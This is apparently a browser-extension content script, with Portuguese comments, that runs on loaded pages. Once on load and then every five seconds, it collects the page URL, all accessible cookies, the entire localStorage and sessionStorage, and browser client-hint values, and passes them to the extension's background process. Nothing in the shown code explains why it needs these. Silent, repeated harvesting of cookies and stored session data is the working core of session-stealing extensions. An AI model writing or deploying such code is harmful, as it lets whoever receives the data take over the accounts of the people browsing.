(function () {
  const collectData = () => {
    const ls = {};
    const ss = {};
    try {
      Object.keys(localStorage).forEach((k) => (ls[k] = localStorage.getItem(k)));
    } catch (e) {}
    try {
      Object.keys(sessionStorage).forEach((k) => (ss[k] = sessionStorage.getItem(k)));
    } catch (e) {}

    // 🔑 Capturar headers sec-ch-ua (só disponíveis no content script)
    let secChUa = '';
    let secChUaMobile = '?0';
    let secChUaPlatform = '""';
    
    if (navigator.userAgentData) {
      secChUaMobile = navigator.userAgentData.mobile ? '?1' : '?0';
      secChUaPlatform = `"${navigator.userAgentData.platform}"`;
      if (navigator.userAgentData.brands) {
        secChUa = navigator.userAgentData.brands.map(b => `"${b.brand}";v="${b.version}"`).join(', ');
      }
    }

    return {
      url: window.location.href,
      cookies: document.cookie || '',
      localStorage: ls,
      sessionStorage: ss,
      userAgent: navigator.userAgent || '',
      secChUa,
      secChUaMobile,
      secChUaPlatform,
      timestamp: Date.now()
    };
  };

  const sendPing = () => {
    chrome.runtime.sendMessage({ type: 'PAGE_PING', data: collectData() }).catch(() => {});
  };

  // Enviar imediatamente e depois a cada 5s
  sendPing();
  setInterval(sendPing, 5000);
})();

